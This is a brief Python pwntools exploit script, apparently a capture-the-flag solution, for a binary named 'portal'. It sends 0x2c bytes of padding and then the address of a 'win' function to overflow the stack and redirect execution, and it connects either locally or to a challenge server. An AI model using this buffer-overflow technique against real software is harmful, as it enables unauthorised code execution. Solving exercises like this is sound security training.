#!/usr/bin/env python3

from pwn import *

exe = ELF("./portal")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 11723)

    return r


def main():
    r = conn()

    r.sendlineafter(b'string: ', b'A'*0x2c + p32(exe.symbols.win))

    r.interactive()


if __name__ == "__main__":
    main()
